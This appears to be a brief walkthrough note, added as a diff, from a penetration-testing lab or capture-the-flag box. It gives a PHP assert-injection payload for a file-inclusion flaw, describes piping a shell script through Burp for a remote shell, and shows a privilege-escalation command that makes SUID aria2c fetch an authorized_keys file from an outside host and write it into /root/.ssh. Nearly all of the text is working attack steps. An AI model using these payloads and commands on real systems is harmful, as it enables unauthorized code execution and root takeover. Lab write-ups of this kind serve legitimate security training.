@@ -1,0 +1,11 @@
+we found place for lfi but no payload was working ..now we  used assert lfi
+
+```
+' and die(system("whoami")) or '
+```
+
+we can make a sh file in our pc and pipe it as bash in burp to get shell
+
+now priv esc was as suid was set for aria2c
+
+/usr/bin/aria2c -d /root/.ssh/ -o authorized_keys "http://192.168.49.119:8000/authorized_keys" --allow-overwrite=true
